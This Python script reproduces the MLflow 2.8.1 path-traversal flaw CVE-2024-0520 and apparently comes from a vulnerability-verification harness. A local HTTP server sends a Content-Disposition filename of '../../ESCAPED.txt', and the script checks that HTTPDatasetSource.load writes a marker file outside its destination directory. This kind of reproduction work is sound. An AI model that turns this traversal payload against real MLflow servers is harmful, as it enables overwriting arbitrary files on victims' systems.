"""CVE-2024-0520 dynamic reproduction (MLflow 2.8.1).

``HTTPDatasetSource.load`` trusts the ``Content-Disposition`` filename and
joins it to ``dst_path`` without normalization.  A local HTTP server returns a
traversal filename; the real MLflow 2.8.1 class writes outside the requested
destination directory.
"""

from __future__ import annotations

import http.server
import json
import sys
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import poclib  # noqa: E402


def main() -> None:
    from mlflow.data.http_dataset_source import HTTPDatasetSource

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    text = poclib.MARKER_TEXT
    poclib.start_marker("ABSENT")

    base = poclib.EVIDENCE_DIR / "http-dataset"
    if base.exists():
        import shutil

        shutil.rmtree(base)
    dst = base / "dst"
    dst.mkdir(parents=True)
    proof = poclib.EVIDENCE_DIR / "ESCAPED.txt"

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            body = text.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Disposition", 'attachment; filename="../../ESCAPED.txt"')
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):  # noqa: ANN002
            return

    server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    url = f"http://127.0.0.1:{server.server_port}/dataset.csv"
    returned = None
    error = None
    try:
        returned = HTTPDatasetSource(url).load(dst_path=str(dst))
    except Exception as exc:
        error = f"{type(exc).__name__}: {exc}"
    finally:
        server.shutdown()

    if not proof.is_file() or text not in poclib.read_text(proof):
        poclib.fail("HTTPDatasetSource traversal did not escape dst_path", returned=returned, error=error)

    poclib.prove_marker(text)
    poclib.finish_verified(
        {
            "transport": {
                "type": "function+http",
                "entrypoint": "mlflow.data.http_dataset_source.HTTPDatasetSource.load",
                "url": url,
                "dst_path": poclib.rel(dst),
                "returned": poclib.rel(returned) if returned else None,
                "escaped_path": poclib.rel(proof),
                "escaped_sha256": poclib.sha256_file(proof),
                "content_disposition": 'attachment; filename="../../ESCAPED.txt"',
                "package": manifest.get("version_ref", {}).get("package"),
                "version": manifest.get("version"),
                "error_after_write": error,
            },
            "request_response": [
                {
                    "method": "GET",
                    "url": url,
                    "response_header": 'Content-Disposition: attachment; filename="../../ESCAPED.txt"',
                    "result": "file written outside dst_path",
                }
            ],
            "state_before": "ESCAPED.txt absent",
            "state_after": "ESCAPED.txt exists with proof text",
        }
    )


if __name__ == "__main__":
    main()

